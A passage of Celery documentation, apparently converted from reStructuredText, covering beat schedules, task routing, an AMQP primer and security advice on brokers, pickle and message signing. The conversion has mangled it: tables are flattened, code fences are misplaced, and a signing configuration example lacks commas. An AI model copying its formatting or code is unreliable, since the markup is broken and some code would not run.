\+-----------------------------------------+--------------------------------------------+ `` ` | **Example**                             | **Meaning**                                | +-----------------------------------------+--------------------------------------------+ | ``crontab()`| Execute every minute.                      | +-----------------------------------------+--------------------------------------------+ |`crontab(minute=0, hour=0)`| Execute daily at midnight.                 | +-----------------------------------------+--------------------------------------------+ |`crontab(minute=0, hour='*/3')\`\` | Execute every three hours: | | | midnight, 3am, 6am, 9am, | | | noon, 3pm, 6pm, 9pm. | +-----------------------------------------+--------------------------------------------+ | \`\`crontab(minute=0,\`\` | Same as previous. | | \`\`hour='0,3,6,9,12,15,18,21')\`\` | | +-----------------------------------------+--------------------------------------------+ | \`\`crontab(minute='*/15')`| Execute every 15 minutes.                  | +-----------------------------------------+--------------------------------------------+ |`crontab(day\_of\_week='sunday')`| Execute every minute (!) at Sundays.       | +-----------------------------------------+--------------------------------------------+ |`crontab(minute='*',\`\` | Same as previous. | | \`\`hour='*',`|                                            | |`day\_of\_week='sun')`|                                            | +-----------------------------------------+--------------------------------------------+ |`crontab(minute='*/10',\`\` | Execute every ten minutes, but only | | \`\`hour='3,17,22',\`\` | between 3-4 am, 5-6 pm, and 10-11 pm on | | \`\`day\_of\_week='thu,fri')\`\` | Thursdays or Fridays. | +-----------------------------------------+--------------------------------------------+ | \`\`crontab(minute=0, hour='*/2,\*/3')`| Execute every even hour, and every hour    | |                                         | divisible by three. This means:            | |                                         | at every hour *except*: 1am,               | |                                         | 5am, 7am, 11am, 1pm, 5pm, 7pm,             | |                                         | 11pm                                       | +-----------------------------------------+--------------------------------------------+ |`crontab(minute=0, hour='*/5')\`\` | Execute hour divisible by 5. This means | | | that it is triggered at 3pm, not 5pm | | | (since 3pm equals the 24-hour clock | | | value of "15", which is divisible by 5). | +-----------------------------------------+--------------------------------------------+ | \`\`crontab(minute=0, hour='*/3,8-17')`| Execute every hour divisible by 3, and     | |                                         | every hour during office hours (8am-5pm).  | +-----------------------------------------+--------------------------------------------+ |`crontab(0, 0, day\_of\_month='2')`| Execute on the second day of every month.  | |                                         |                                            | +-----------------------------------------+--------------------------------------------+ |`crontab(0, 0,`| Execute on every even numbered day.        | |`day\_of\_month='2-30/2')`|                                            | +-----------------------------------------+--------------------------------------------+ |`crontab(0, 0,`| Execute on the first and third weeks of    | |`day\_of\_month='1-7,15-21')`| the month.                                 | +-----------------------------------------+--------------------------------------------+ |`crontab(0, 0, day\_of\_month='11',`| Execute on the eleventh of May every year. | |`month\_of\_year='5')`|                                            | +-----------------------------------------+--------------------------------------------+ |`crontab(0, 0,`| Execute every day on the first month       | |`month\_of\_year='\*/3')``| of every quarter.                          | +-----------------------------------------+--------------------------------------------+  See `celery.schedules.crontab` for more documentation.  .. _beat-solar:  Solar schedules =================  If you have a task that should be executed according to sunrise, sunset, dawn or dusk, you can use the `~celery.schedules.solar` schedule type:``\`python from celery.schedules import solar

>   - app.conf.beat\_schedule = {  
>     \# Executes at sunset in Melbourne 'add-at-melbourne-sunset': { 'task': 'tasks.add', 'schedule': solar('sunset', -37.81753, 144.96715), 'args': (16, 16), },
> 
> }

The arguments are simply: `solar(event, latitude, longitude)`

Be sure to use the correct sign for latitude and longitude:

\+---------------+-------------------+----------------------+ `` ` | **Sign**      | **Argument**      | **Meaning**          | +---------------+-------------------+----------------------+ | ``+`|`latitude`| North                | +---------------+-------------------+----------------------+ |`-`|`latitude`| South                | +---------------+-------------------+----------------------+ |`+`|`longitude`| East                 | +---------------+-------------------+----------------------+ |`-`|`longitude`| West                 | +---------------+-------------------+----------------------+  Possible event types are:  +-----------------------------------------+--------------------------------------------+ | **Event**                               | **Meaning**                                | +-----------------------------------------+--------------------------------------------+ |`dawn\_astronomical`| Execute at the moment after which the sky  | |                                         | is no longer completely dark. This is when | |                                         | the sun is 18 degrees below the horizon.   | +-----------------------------------------+--------------------------------------------+ |`dawn\_nautical`| Execute when there's enough sunlight for   | |                                         | the horizon and some objects to be         | |                                         | distinguishable; formally, when the sun is | |                                         | 12 degrees below the horizon.              | +-----------------------------------------+--------------------------------------------+ |`dawn\_civil`| Execute when there's enough light for      | |                                         | objects to be distinguishable so that      | |                                         | outdoor activities can commence;           | |                                         | formally, when the Sun is 6 degrees below  | |                                         | the horizon.                               | +-----------------------------------------+--------------------------------------------+ |`sunrise`| Execute when the upper edge of the sun     | |                                         | appears over the eastern horizon in the    | |                                         | morning.                                   | +-----------------------------------------+--------------------------------------------+ |`solar\_noon`| Execute when the sun is highest above the  | |                                         | horizon on that day.                       | +-----------------------------------------+--------------------------------------------+ |`sunset`| Execute when the trailing edge of the sun  | |                                         | disappears over the western horizon in the | |                                         | evening.                                   | +-----------------------------------------+--------------------------------------------+ |`dusk\_civil`| Execute at the end of civil twilight, when | |                                         | objects are still distinguishable and some | |                                         | stars and planets are visible. Formally,   | |                                         | when the sun is 6 degrees below the        | |                                         | horizon.                                   | +-----------------------------------------+--------------------------------------------+ |`dusk\_nautical`| Execute when the sun is 12 degrees below   | |                                         | the horizon. Objects are no longer         | |                                         | distinguishable, and the horizon is no     | |                                         | longer visible to the naked eye.           | +-----------------------------------------+--------------------------------------------+ |`dusk\_astronomical`| Execute at the moment after which the sky  | |                                         | becomes completely dark; formally, when    | |                                         | the sun is 18 degrees below the horizon.   | +-----------------------------------------+--------------------------------------------+  All solar events are calculated using UTC, and are therefore unaffected by your timezone setting.  In polar regions, the sun may not rise or set every day. The scheduler is able to handle these cases (i.e., a`sunrise`event won't run on a day when the sun doesn't rise). The one exception is`solar\_noon``, which is formally defined as the moment the sun transits the celestial meridian, and will occur every day even if the sun is below the horizon.  Twilight is defined as the period between dawn and sunrise; and between sunset and dusk. You can schedule an event according to "twilight" depending on your definition of twilight (civil, nautical, or astronomical), and whether you want the event to take place at the beginning or end of twilight, using the appropriate event from the list above.  See `celery.schedules.solar` for more documentation.  .. _beat-starting:  Starting the Scheduler ======================  To start the :program:`celery beat` service:``\`console $ celery -A proj beat

You can also embed <span class="title-ref">beat</span> inside the worker by enabling the `` ` workers :option:`-B <celery worker -B>` option, this is convenient if you'll never run more than one worker node, but it's not commonly used and for that reason isn't recommended for production use: ``\`console $ celery -A proj worker -B

Beat needs to store the last run times of the tasks in a local database `` ` file (named `celerybeat-schedule` by default), so it needs access to write in the current directory, or alternatively you can specify a custom location for this file: ``\`console $ celery -A proj beat -s /home/celery/var/run/celerybeat-schedule

\> **Note** \> To daemonize beat see \[daemonizing\](\#daemonizing).

<div id="beat-custom-schedulers">

Using custom scheduler classes `` ` ------------------------------  Custom scheduler classes can be specified on the command-line (the :option:`--scheduler <celery beat --scheduler>` argument).  The default scheduler is the `celery.beat.PersistentScheduler`, that simply keeps track of the last run times in a local :mod:`shelve` database file.  There's also the :pypi:`django-celery-beat` extension that stores the schedule in the Django database, and presents a convenient admin interface to manage periodic tasks at runtime.  To install and use this extension:  #. Use :command:`pip` to install the package: ``\`console $ pip install django-celery-beat

</div>

1.  Add the `django_celery_beat` module to `INSTALLED_APPS` in your Django project' `settings.py`:
    
        INSTALLED_APPS = (
            ...,
            'django_celery_beat',
        )
    
    Note that there is no dash in the module name, only underscores.

2.  Apply Django database migrations so that the necessary tables are created:
    
    > 
    > 
    > ``` console
    > $ python manage.py migrate
    > ```

3.  Start the `celery beat` service using the `django_celery_beat.schedulers:DatabaseScheduler` scheduler:
    
    > 
    > 
    > ``` console
    > $ celery -A proj beat -l INFO --scheduler django_celery_beat.schedulers:DatabaseScheduler
    > ```
    
    Note: You may also add this as the `beat_scheduler` setting directly.

\#. Visit the Django-Admin interface to set up some periodic tasks. \`\`\`

---

routing.md

---

# Routing Tasks

\> **Note** \> Alternate routing concepts like topic and fanout is not available for all transports, please consult the \[transport comparison table \<kombu:transport-comparison\>\](\#transport-comparison-table-\<kombu:transport-comparison\>).

<div class="contents" data-local="">

</div>

## Basics

### Automatic routing

The simplest way to do routing is to use the `task_create_missing_queues` setting (on by default).

With this setting on, a named queue that's not already defined in `task_queues` will be created automatically. This makes it easy to perform simple routing tasks.

Say you have two servers, <span class="title-ref">x</span>, and <span class="title-ref">y</span> that handle regular tasks, and one server <span class="title-ref">z</span>, that only handles feed related tasks. You can use this configuration:

    task_routes = {'feed.tasks.import_feed': {'queue': 'feeds'}}

With this route enabled import feed tasks will be routed to the <span class="title-ref">"feeds"</span> queue, while all other tasks will be routed to the default queue (named <span class="title-ref">"celery"</span> for historical reasons).

Alternatively, you can use glob pattern matching, or even regular expressions, to match all tasks in the `feed.tasks` name-space:

`` `python     app.conf.task_routes = {'feed.tasks.*': {'queue': 'feeds'}}  If the order of matching patterns is important you should ``\` specify the router in *items* format instead:

`` `python     task_routes = ([         ('feed.tasks.*', {'queue': 'feeds'}),         ('web.tasks.*', {'queue': 'web'}),         (re.compile(r'(video|image)\.tasks\..*'), {'queue': 'media'}),     ],)  > **Note** >      The :setting:`task_routes` setting can either be a dictionary, or a     list of router objects, so in this case we need to specify the setting     as a tuple containing a list.  After installing the router, you can start server `z` to only process the feeds ``\` queue like this:

`` `console     user@z:/$ celery -A proj worker -Q feeds  You can specify as many queues as you want, so you can make this server ``\` process the default queue as well:

`` `console     user@z:/$ celery -A proj worker -Q feeds,celery  .. _routing-changing-default-queue:  Changing the name of the default queue ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

You can change the name of the default queue by using the following configuration:

`` `python     app.conf.task_default_queue = 'default'  .. _routing-autoqueue-details:  How the queues are defined ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

The point with this feature is to hide the complex AMQP protocol for users with only basic needs. However -- you may still be interested in how these queues are declared.

A queue named <span class="title-ref">"video"</span> will be created with the following settings:

`` `javascript     {'exchange': 'video',      'exchange_type': 'direct',      'routing_key': 'video'}  The non-AMQP backends like `Redis` or `SQS` don't support exchanges, ``\` so they require the exchange to have the same name as the queue. Using this design ensures it will work for them as well.

### Manual routing

Say you have two servers, <span class="title-ref">x</span>, and <span class="title-ref">y</span> that handle regular tasks, and one server <span class="title-ref">z</span>, that only handles feed related tasks, you can use this configuration:

`` `python     from kombu import Queue      app.conf.task_default_queue = 'default'     app.conf.task_queues = (         Queue('default',    routing_key='task.#'),         Queue('feed_tasks', routing_key='feed.#'),     )     app.conf.task_default_exchange = 'tasks'     app.conf.task_default_exchange_type = 'topic'     app.conf.task_default_routing_key = 'task.default'  :setting:`task_queues` is a list of `~kombu.entity.Queue` ``<span class="title-ref"> instances. If you don't set the exchange or exchange type values for a key, these will be taken from the :setting:\`task\_default\_exchange</span> and `task_default_exchange_type` settings.

To route a task to the <span class="title-ref">feed\_tasks</span> queue, you can add an entry in the `task_routes` setting:

`` `python     task_routes = {             'feeds.tasks.import_feed': {                 'queue': 'feed_tasks',                 'routing_key': 'feed.import',             },     }   You can also override this using the `routing_key` argument to ``<span class="title-ref"> \`Task.apply\_async</span>, or \`\~celery.execute.send\_task\`:

> \>\>\> from feeds.tasks import import\_feed \>\>\> import\_feed.apply\_async(args=\['<http://cnn.com/rss>'\], ... queue='feed\_tasks', ... routing\_key='feed.import')

To make server <span class="title-ref">z</span> consume from the feed queue exclusively you can start it with the `celery worker -Q` option:

`` `console     user@z:/$ celery -A proj worker -Q feed_tasks --hostname=z@%h  Servers `x` and `y` must be configured to consume from the default queue:  .. code-block:: console      user@x:/$ celery -A proj worker -Q default --hostname=x@%h     user@y:/$ celery -A proj worker -Q default --hostname=y@%h  If you want, you can even have your feed processing worker handle regular ``\` tasks as well, maybe in times when there's a lot of work to do:

`` `console     user@z:/$ celery -A proj worker -Q feed_tasks,default --hostname=z@%h  If you have another queue but on another exchange you want to add, ``\` just specify a custom exchange and exchange type:

`` `python     from kombu import Exchange, Queue      app.conf.task_queues = (         Queue('feed_tasks',    routing_key='feed.#'),         Queue('regular_tasks', routing_key='task.#'),         Queue('image_tasks',   exchange=Exchange('mediatasks', type='direct'),                                routing_key='image.compress'),     )  If you're confused about these terms, you should read up on AMQP.  .. seealso::      In addition to the [amqp-primer](#amqp-primer) below, there's     `Rabbits and Warrens`_, an excellent blog post describing queues and     exchanges. There's also The `CloudAMQP tutorial`,     For users of RabbitMQ the `RabbitMQ FAQ`_     could be useful as a source of information. ``\` .. \_\`CloudAMQP tutorial\`: amqp in 10 minutes part 3 <https://www.cloudamqp.com/blog/2015-09-03-part4-rabbitmq-for-beginners-exchanges-routing-keys-bindings.html> .. \_\`RabbitMQ FAQ\`: <https://www.rabbitmq.com/faq.html>

## Special Routing Options

### RabbitMQ Message Priorities

  - supported transports  
    RabbitMQ

<div class="versionadded">

4.0

</div>

Queues can be configured to support priorities by setting the `x-max-priority` argument:

`` `python     from kombu import Exchange, Queue      app.conf.task_queues = [         Queue('tasks', Exchange('tasks'), routing_key='tasks',               queue_arguments={'x-max-priority': 10}),     ]  A default value for all queues can be set using the ``<span class="title-ref"> :setting:\`task\_queue\_max\_priority</span> setting:

`` `python     app.conf.task_queue_max_priority = 10  A default priority for all tasks can also be specified using the ``<span class="title-ref"> :setting:\`task\_default\_priority</span> setting:

`` `python     app.conf.task_default_priority = 5  .. _amqp-primer:   Redis Message Priorities ``\` ------------------------:supported transports: Redis

While the Celery Redis transport does honor the priority field, Redis itself has no notion of priorities. Please read this note before attempting to implement priorities with Redis as you may experience some unexpected behavior.

To start scheduling tasks based on priorities you need to configure queue\_order\_strategy transport option.

`` `python     app.conf.broker_transport_options = {         'queue_order_strategy': 'priority',     }   The priority support is implemented by creating n lists for each queue. ``\` This means that even though there are 10 (0-9) priority levels, these are consolidated into 4 levels by default to save resources. This means that a queue named celery will really be split into 4 queues.

The highest priority queue will be named celery, and the the other queues will have a separator (by default <span class="title-ref">x06x16</span>) and their priority number appended to the queue name.

`` `python     ['celery', 'celery\x06\x163', 'celery\x06\x166', 'celery\x06\x169']   If you want more priority levels or a different separator you can set the ``\` priority\_steps and sep transport options:

`` `python     app.conf.broker_transport_options = {         'priority_steps': list(range(10)),         'sep': ':',         'queue_order_strategy': 'priority',     }  The config above will give you these queue names:  .. code-block:: python      ['celery', 'celery:1', 'celery:2', 'celery:3', 'celery:4', 'celery:5', 'celery:6', 'celery:7', 'celery:8', 'celery:9']   That said, note that this will never be as good as priorities implemented at the ``\` broker server level, and may be approximate at best. But it may still be good enough for your application.

## AMQP Primer

### Messages

A message consists of headers and a body. Celery uses headers to store the content type of the message and its content encoding. The content type is usually the serialization format used to serialize the message. The body contains the name of the task to execute, the task id (UUID), the arguments to apply it with and some additional meta-data -- like the number of retries or an ETA.

This is an example task message represented as a Python dictionary:

`` `javascript     {'task': 'myapp.tasks.add',      'id': '54086c5e-6193-4575-8308-dbab76798756',      'args': [4, 4],      'kwargs': {}}  .. _amqp-producers-consumers-brokers:  Producers, consumers, and brokers ``\` ---------------------------------

The client sending messages is typically called a *publisher*, or a *producer*, while the entity receiving messages is called a *consumer*.

The *broker* is the message server, routing messages from producers to consumers.

You're likely to see these terms used a lot in AMQP related material.

### Exchanges, queues, and routing keys

1.  Messages are sent to exchanges.
2.  An exchange routes messages to one or more queues. Several exchange types exists, providing different ways to do routing, or implementing different messaging scenarios.
3.  The message waits in the queue until someone consumes it.
4.  The message is deleted from the queue when it has been acknowledged.

The steps required to send and receive messages are:

1.  Create an exchange
2.  Create a queue
3.  Bind the queue to the exchange.

Celery automatically creates the entities necessary for the queues in `task_queues` to work (except if the queue's <span class="title-ref">auto\_declare</span> setting is set to <span class="title-ref">False</span>).

Here's an example queue configuration with three queues; One for video, one for images, and one default queue for everything else:

`` `python     from kombu import Exchange, Queue      app.conf.task_queues = (         Queue('default', Exchange('default'), routing_key='default'),         Queue('videos',  Exchange('media'),   routing_key='media.video'),         Queue('images',  Exchange('media'),   routing_key='media.image'),     )     app.conf.task_default_queue = 'default'     app.conf.task_default_exchange_type = 'direct'     app.conf.task_default_routing_key = 'default'  .. _amqp-exchange-types:  Exchange types ``\` --------------

The exchange type defines how the messages are routed through the exchange. The exchange types defined in the standard are <span class="title-ref">direct</span>, <span class="title-ref">topic</span>, <span class="title-ref">fanout</span> and <span class="title-ref">headers</span>. Also non-standard exchange types are available as plug-ins to RabbitMQ, like the [last-value-cache plug-in](https://github.com/squaremo/rabbitmq-lvc-plugin) by Michael Bridgen.

#### Direct exchanges

Direct exchanges match by exact routing keys, so a queue bound by the routing key <span class="title-ref">video</span> only receives messages with that routing key.

#### Topic exchanges

Topic exchanges matches routing keys using dot-separated words, and the wild-card characters: `*` (matches a single word), and `#` (matches zero or more words).

With routing keys like `usa.news`, `usa.weather`, `norway.news`, and `norway.weather`, bindings could be `*.news` (all news), `usa.#` (all items in the USA), or `usa.weather` (all USA weather items).

### Related API commands

<div class="method">

exchange.declare(exchange\_name, type, passive, durable, auto\_delete, internal)

Declares an exchange by name.

See <span class="title-ref">amqp:Channel.exchange\_declare \<amqp.channel.Channel.exchange\_declare\></span>.

  - keyword passive  
    Passive means the exchange won't be created, but you can use this to check if the exchange already exists.

  - keyword durable  
    Durable exchanges are persistent (i.e., they survive a broker restart).

  - keyword auto\_delete  
    This means the exchange will be deleted by the broker when there are no more queues using it.

</div>

<div class="method">

queue.declare(queue\_name, passive, durable, exclusive, auto\_delete)

Declares a queue by name.

See <span class="title-ref">amqp:Channel.queue\_declare \<amqp.channel.Channel.queue\_declare\></span>

Exclusive queues can only be consumed from by the current connection. Exclusive also implies <span class="title-ref">auto\_delete</span>.

</div>

<div class="method">

queue.bind(queue\_name, exchange\_name, routing\_key)

Binds a queue to an exchange with a routing key.

Unbound queues won't receive messages, so this is necessary.

See <span class="title-ref">amqp:Channel.queue\_bind \<amqp.channel.Channel.queue\_bind\></span>

</div>

<div class="method">

queue.delete(name, if\_unused=False, if\_empty=False)

Deletes a queue and its binding.

See <span class="title-ref">amqp:Channel.queue\_delete \<amqp.channel.Channel.queue\_delete\></span>

</div>

<div class="method">

exchange.delete(name, if\_unused=False)

Deletes an exchange.

See <span class="title-ref">amqp:Channel.exchange\_delete \<amqp.channel.Channel.exchange\_delete\></span>

</div>

\> **Note** \> Declaring doesn't necessarily mean "create". When you declare you *assert* that the entity exists and that it's operable. There's no rule as to whom should initially create the exchange/queue/binding, whether consumer or producer. Usually the first one to need it will be the one to create it.

### Hands-on with the API

Celery comes with a tool called `celery amqp` that's used for command line access to the AMQP API, enabling access to administration tasks like creating/deleting queues and exchanges, purging queues or sending messages. It can also be used for non-AMQP brokers, but different implementation may not implement all commands.

You can write commands directly in the arguments to `celery amqp`, or just start with no arguments to start it in shell-mode:

`` `console     $ celery -A proj amqp     -> connecting to amqp://guest@localhost:5672/.     -> connected.     1>  Here ``1\>`is the prompt. The number 1, is the number of commands you`<span class="title-ref"> have executed so far. Type </span><span class="title-ref">help</span><span class="title-ref"> for a list of commands available. It also supports auto-completion, so you can start typing a command and then hit the \`tab</span> key to show a list of possible matches.

Let's create a queue you can send messages to:

`` `console     $ celery -A proj amqp     1> exchange.declare testexchange direct     ok.     2> queue.declare testqueue     ok. queue:testqueue messages:0 consumers:0.     3> queue.bind testqueue testexchange testkey     ok.  This created the direct exchange ``testexchange`, and a queue`<span class="title-ref"> named </span><span class="title-ref">testqueue</span><span class="title-ref">. The queue is bound to the exchange using the routing key </span><span class="title-ref">testkey</span>\`.

From now on all messages sent to the exchange `testexchange` with routing key `testkey` will be moved to this queue. You can send a message by using the `basic.publish` command:

`` `console     4> basic.publish 'This is a message!' testexchange testkey     ok.  Now that the message is sent you can retrieve it again. You can use the ``<span class="title-ref"> </span><span class="title-ref">basic.get</span><span class="title-ref"> command here, that polls for new messages on the queue in a synchronous manner (this is OK for maintenance tasks, but for services you want to use </span><span class="title-ref">basic.consume</span>\` instead)

Pop a message off the queue:

`` `console     5> basic.get testqueue     {'body': 'This is a message!',      'delivery_info': {'delivery_tag': 1,                        'exchange': u'testexchange',                        'message_count': 0,                        'redelivered': False,                        'routing_key': u'testkey'},      'properties': {}}   AMQP uses acknowledgment to signify that a message has been received ``\` and processed successfully. If the message hasn't been acknowledged and consumer channel is closed, the message will be delivered to another consumer.

Note the delivery tag listed in the structure above; Within a connection channel, every received message has a unique delivery tag, This tag is used to acknowledge the message. Also note that delivery tags aren't unique across connections, so in another client the delivery tag <span class="title-ref">1</span> might point to a different message than in this channel.

You can acknowledge the message you received using `basic.ack`:

`` `console     6> basic.ack 1     ok.  To clean up after our test session you should delete the entities you created:  .. code-block:: console      7> queue.delete testqueue     ok. 0 messages deleted.     8> exchange.delete testexchange     ok.   .. _routing-tasks:  Routing Tasks ``\` =============

### Defining queues

In Celery available queues are defined by the `task_queues` setting.

Here's an example queue configuration with three queues; One for video, one for images, and one default queue for everything else:

`` `python     default_exchange = Exchange('default', type='direct')     media_exchange = Exchange('media', type='direct')      app.conf.task_queues = (         Queue('default', default_exchange, routing_key='default'),         Queue('videos', media_exchange, routing_key='media.video'),         Queue('images', media_exchange, routing_key='media.image')     )     app.conf.task_default_queue = 'default'     app.conf.task_default_exchange = 'default'     app.conf.task_default_routing_key = 'default'  Here, the :setting:`task_default_queue` will be used to route tasks that ``\` doesn't have an explicit route.

The default exchange, exchange type, and routing key will be used as the default routing values for tasks, and as the default values for entries in `task_queues`.

Multiple bindings to a single queue are also supported. Here's an example of two routing keys that are both bound to the same queue:

`` `python     from kombu import Exchange, Queue, binding      media_exchange = Exchange('media', type='direct')      CELERY_QUEUES = (         Queue('media', [             binding(media_exchange, routing_key='media.video'),             binding(media_exchange, routing_key='media.image'),         ]),     )   .. _routing-task-destination:  Specifying task destination ``\` ---------------------------

The destination for a task is decided by the following (in order):

1.  The routing arguments to <span class="title-ref">Task.apply\_async</span>.
2.  Routing related attributes defined on the <span class="title-ref">\~celery.app.task.Task</span> itself.
3.  The \[routers\](\#routers) defined in `task_routes`.

It's considered best practice to not hard-code these settings, but rather leave that as configuration options by using \[routers\](\#routers); This is the most flexible approach, but sensible defaults can still be set as task attributes.

### Routers

A router is a function that decides the routing options for a task.

All you need to define a new router is to define a function with the signature `(name, args, kwargs, options, task=None, **kw)`:

`` `python     def route_task(name, args, kwargs, options, task=None, **kw):             if name == 'myapp.tasks.compress_video':                 return {'exchange': 'video',                         'exchange_type': 'topic',                         'routing_key': 'video.compress'}  If you return the ``queue`key, it'll expand with the defined settings of`\` that queue in `task_queues`:

`` `javascript     {'queue': 'video', 'routing_key': 'video.compress'}  becomes -->  .. code-block:: javascript          {'queue': 'video',          'exchange': 'video',          'exchange_type': 'topic',          'routing_key': 'video.compress'}   You install router classes by adding them to the :setting:`task_routes` ``\` setting:

`` `python     task_routes = (route_task,)  Router functions can also be added by name:  .. code-block:: python      task_routes = ('myapp.routers.route_task',)   For simple task name -> route mappings like the router example above, ``<span class="title-ref"> you can simply drop a dict into :setting:\`task\_routes</span> to get the same behavior:

`` `python     task_routes = {         'myapp.tasks.compress_video': {             'queue': 'video',             'routing_key': 'video.compress',         },     }  The routers will then be traversed in order, it will stop at the first router ``\` returning a true value, and use that as the final route for the task.

You can also have multiple routers defined in a sequence:

`` `python     task_routes = [         route_task,         {             'myapp.tasks.compress_video': {                 'queue': 'video',                 'routing_key': 'video.compress',         },     ]  The routers will then be visited in turn, and the first to return ``\` a value will be chosen.

If you're using Redis or RabbitMQ you can also specify the queue's default priority in the route.

`` `python     task_routes = {         'myapp.tasks.compress_video': {             'queue': 'video',             'routing_key': 'video.compress',             'priority': 10,         },     }   Similarly, calling `apply_async` on a task will override that ``\` default priority.

`` `python     task.apply_async(priority=0)   .. admonition:: Priority Order and Cluster Responsiveness      It is important to note that, due to worker prefetching, if a bunch of tasks     submitted at the same time they may be out of priority order at first.     Disabling worker prefetching will prevent this issue, but may cause less than     ideal performance for small, fast tasks. In most cases, simply reducing     `worker_prefetch_multiplier` to 1 is an easier and cleaner way to increase the     responsiveness of your system without the costs of disabling prefetching     entirely.      Note that priorities values are sorted in reverse when     using the redis broker: 0 being highest priority.   Broadcast ``\` ---------

Celery can also support broadcast routing. Here is an example exchange `broadcast_tasks` that delivers copies of tasks to all workers connected to it:

`` `python     from kombu.common import Broadcast      app.conf.task_queues = (Broadcast('broadcast_tasks'),)     app.conf.task_routes = {         'tasks.reload_cache': {             'queue': 'broadcast_tasks',             'exchange': 'broadcast_tasks'         }     }  Now the ``tasks.reload\_cache`task will be sent to every`\` worker consuming from this queue.

Here is another example of broadcast routing, this time with a `celery beat` schedule:

`` `python     from kombu.common import Broadcast     from celery.schedules import crontab      app.conf.task_queues = (Broadcast('broadcast_tasks'),)      app.conf.beat_schedule = {         'test-task': {             'task': 'tasks.reload_cache',             'schedule': crontab(minute=0, hour='*/3'),             'options': {'exchange': 'broadcast_tasks'}         },     }   .. admonition:: Broadcast & Results      Note that Celery result doesn't define what happens if two     tasks have the same task_id. If the same task is distributed to more     than one worker, then the state history may not be preserved.      It's a good idea to set the ``task.ignore\_result`attribute in     this case.`\`

---

security.md

---

# Security

<div class="contents" data-local="">

</div>

## Introduction

While Celery is written with security in mind, it should be treated as an unsafe component.

Depending on your [Security Policy](https://en.wikipedia.org/wiki/Security_policy), there are various steps you can take to make your Celery installation more secure.

## Areas of Concern

### Broker

It's imperative that the broker is guarded from unwanted access, especially if accessible to the public. By default, workers trust that the data they get from the broker hasn't been tampered with. See [Message Signing](#message-signing) for information on how to make the broker connection more trustworthy.

The first line of defense should be to put a firewall in front of the broker, allowing only white-listed machines to access it.

Keep in mind that both firewall misconfiguration, and temporarily disabling the firewall, is common in the real world. Solid security policy includes monitoring of firewall equipment to detect if they've been disabled, be it accidentally or on purpose.

In other words, one shouldn't blindly trust the firewall either.

If your broker supports fine-grained access control, like RabbitMQ, this is something you should look at enabling. See for example <http://www.rabbitmq.com/access-control.html>.

If supported by your broker backend, you can enable end-to-end SSL encryption and authentication using `broker_use_ssl`.

### Client

In Celery, "client" refers to anything that sends messages to the broker, for example web-servers that apply tasks.

Having the broker properly secured doesn't matter if arbitrary messages can be sent through a client.

*\[Need more text here\]*

### Worker

The default permissions of tasks running inside a worker are the same ones as the privileges of the worker itself. This applies to resources, such as; memory, file-systems, and devices.

An exception to this rule is when using the multiprocessing based task pool, which is currently the default. In this case, the task will have access to any memory copied as a result of the <span class="title-ref">fork</span> call, and access to memory contents written by parent tasks in the same worker child process.

Limiting access to memory contents can be done by launching every task in a subprocess (<span class="title-ref">fork</span> + <span class="title-ref">execve</span>).

Limiting file-system and device access can be accomplished by using [chroot](https://en.wikipedia.org/wiki/Chroot), [jail](https://en.wikipedia.org/wiki/FreeBSD_jail), [sandboxing](https://en.wikipedia.org/wiki/Sandbox_\(computer_security\)), virtual machines, or other mechanisms as enabled by the platform or additional software.

Note also that any task executed in the worker will have the same network access as the machine on which it's running. If the worker is located on an internal network it's recommended to add firewall rules for outbound traffic.

## Serializers

The default serializer is JSON since version 4.0, but since it has only support for a restricted set of types you may want to consider using pickle for serialization instead.

The <span class="title-ref">pickle</span> serializer is convenient as it can serialize almost any Python object, even functions with some work, but for the same reasons <span class="title-ref">pickle</span> is inherently insecure\[1\], and should be avoided whenever clients are untrusted or unauthenticated.

You can disable untrusted content by specifying a white-list of accepted content-types in the `accept_content` setting:

<div class="versionadded">

3.0.18

</div>

\> **Note** \> This setting was first supported in version 3.0.18. If you're running an earlier version it will simply be ignored, so make sure you're running a version that supports it.

`` `python     accept_content = ['json']   This accepts a list of serializer names and content-types, so you could ``\` also specify the content type for json:

`` `python     accept_content = ['application/json']  Celery also comes with a special `auth` serializer that validates ``<span class="title-ref"> communication between Celery clients and workers, making sure that messages originates from trusted sources. Using \`Public-key cryptography</span> the <span class="title-ref">auth</span> serializer can verify the authenticity of senders, to enable this read \[message-signing\](\#message-signing) for more information.

## Message Signing

Celery can use the `cryptography` library to sign message using <span class="title-ref">Public-key cryptography</span>, where messages sent by clients are signed using a private key and then later verified by the worker using a public certificate.

Optimally certificates should be signed by an official [Certificate Authority](), but they can also be self-signed.

To enable this you should configure the `task_serializer` setting to use the <span class="title-ref">auth</span> serializer. Enforcing the workers to only accept signed messages, you should set <span class="title-ref">accept\_content</span> to <span class="title-ref">\['auth'\]</span>. For additional signing of the event protocol, set <span class="title-ref">event\_serializer</span> to <span class="title-ref">auth</span>. Also required is configuring the paths used to locate private keys and certificates on the file-system: the `security_key`, `security_certificate`, and `security_cert_store` settings respectively. You can tweak the signing algorithm with `security_digest`. If using an encrypted private key, the password can be configured with `security_key_password`.

With these configured it's also necessary to call the <span class="title-ref">celery.setup\_security</span> function. Note that this will also disable all insecure serializers so that the worker won't accept messages with untrusted content types.

This is an example configuration using the <span class="title-ref">auth</span> serializer, with the private key and certificate files located in <span class="title-ref">/etc/ssl</span>.

`` `python     app = Celery()     app.conf.update(         security_key='/etc/ssl/private/worker.key'         security_certificate='/etc/ssl/certs/worker.pem'         security_cert_store='/etc/ssl/certs/*.pem',         security_digest='sha256',         task_serializer='auth',         event_serializer='auth',         accept_content=['auth']     )     app.setup_security()  > **Note** >      While relative paths aren't disallowed, using absolute paths     is recommended for these files.      Also note that the `auth` serializer won't encrypt the contents of     a message, so if needed this will have to be enabled separately. ``\` .. \_\`Certificate Authority\`: <https://en.wikipedia.org/wiki/Certificate_authority>

## Intrusion Detection

The most important part when defending your systems against intruders is being able to detect if the system has been compromised.

### Logs

Logs are usually the first place to look for evidence of security breaches, but they're useless if they can be tampered with.

A good solution is to set up centralized logging with a dedicated logging server. Access to it should be restricted. In addition to having all of the logs in a single place, if configured correctly, it can make it harder for intruders to tamper with your logs.

This should be fairly easy to setup using syslog (see also [syslog-ng](https://en.wikipedia.org/wiki/Syslog-ng) and [rsyslog](http://www.rsyslog.com/)). Celery uses the `logging` library, and already has support for using syslog.

A tip for the paranoid is to send logs using UDP and cut the transmit part of the logging server's network cable :-)

